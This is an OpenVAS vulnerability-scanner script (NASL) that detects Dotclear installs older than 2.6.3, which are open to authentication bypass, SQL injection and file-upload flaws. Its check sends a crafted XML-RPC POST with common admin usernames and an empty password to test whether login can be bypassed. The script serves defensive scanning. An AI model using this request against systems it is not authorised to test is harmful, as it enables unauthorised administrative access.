###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_dotclear_mult_vuln.nasl 11867 2018-10-12 10:48:11Z cfischer $
#
# Dotclear Multiple Vulnerabilities
#
# Authors:
# Veerendra G.G <veerendragg@secpod.com>
#
# Copyright:
# Copyright (C) 2014 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:dotclear:dotclear";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802076");
  script_version("$Revision: 11867 $");
  script_cve_id("CVE-2014-3781", "CVE-2014-3782", "CVE-2014-3783");
  script_bugtraq_id(67560, 67559, 67557);
  script_tag(name:"cvss_base", value:"6.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:S/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2018-10-12 12:48:11 +0200 (Fri, 12 Oct 2018) $");
  script_tag(name:"creation_date", value:"2014-06-09 14:54:32 +0530 (Mon, 09 Jun 2014)");
  script_name("Dotclear Multiple Vulnerabilities");

  script_tag(name:"summary", value:"This host is installed with Dotclear and is prone to multiple vulnerabilities.");
  script_tag(name:"vuldetect", value:"Send a crafted HTTP POST request and try to bypass authentication.");
  script_tag(name:"insight", value:"- Flaw in due to 'dcXmlRpc::setUser()' method in 'class.dc.xmlrpc.php' fails
  to verify passwords before using it.

  - Flaw is due to is due to the '/admin/categories.php' script not properly
  sanitizing user-supplied input to the 'categories_order' POST parameter.

  - Flaw is due to is due to 'filemanager::isFileExclude()' method does not
  properly verify or sanitize user-uploaded files.");
  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to bypass authentication
  mechanisms, inject or manipulate SQL queries in the back-end database and
  attacker can to execute uploaded script with the privileges of the web server.");
  script_tag(name:"affected", value:"DotClear version before 2.6.3");
  script_tag(name:"solution", value:"Upgrade to version 2.6.3 or later.");

  script_xref(name:"URL", value:"http://karmainsecurity.com/KIS-2014-05");
  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/532184");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2014 Greenbone Networks GmbH");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_app");
  script_xref(name:"URL", value:"http://dotclear.org");
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

http_port = get_http_port(default:80);

host = http_host_name(port:http_port);

foreach dir (make_list_unique("/", "/dotclear", "/cms", "/forum", cgi_dirs(port:http_port)))
{

  if(dir == "/") dir = "";

  dotc_res1 = http_get_cache(item:string(dir, "/index.php"), port:http_port);

  if(">Dotclear<" >< dotc_res1)
  {

    ## Possible usernames to bypass
    foreach username (make_list("admin", "administrator", "root", "dotclear"))
    {
      post_data = string("<methodCall>\r\n",
                  "<methodName>wp.getPostStatusList</methodName>\r\n",
                    "<params>\r\n",
                      "<param><value><i4>1</i4></value></param>\r\n",
                      "<param><value><string>", username, "</string></value></param>\r\n",
                      "<param><value><string></string></value></param>\r\n",
                      "<param><value>\r\n",
                      "</value></param>\r\n",
                    "</params>\r\n",
                  "</methodCall>\r\n");

      post_data_len = strlen(post_data);
      dotc_path = dir + "/index.php?xmlrpc/default";

      dotc_req2 = 'POST ' + dotc_path + ' HTTP/1.1\r\n' +
                  'Host: ' + host + '\r\n' +
                  'Content-Type: application/x-www-form-urlencoded\r\n' +
                  'Cookie: livezilla=Tzo0OiJUZXN0IjowOnt9\r\n' +
                  'Content-Length: ' + post_data_len + '\r\n' +
                  '\r\n' + post_data;
      dotc_res2 = http_keepalive_send_recv(port:http_port, data:dotc_req2, bodyonly:FALSE);

      if("<name>draft</name>" >< dotc_res2 && "<name>private</name>" >< dotc_res2 &&
         "<name>publish</name>" >< dotc_res2 && ">Login error<" >!< dotc_res2)
      {
        security_message(port:http_port);
        exit(0);
      }
    }
  }
}

exit(99);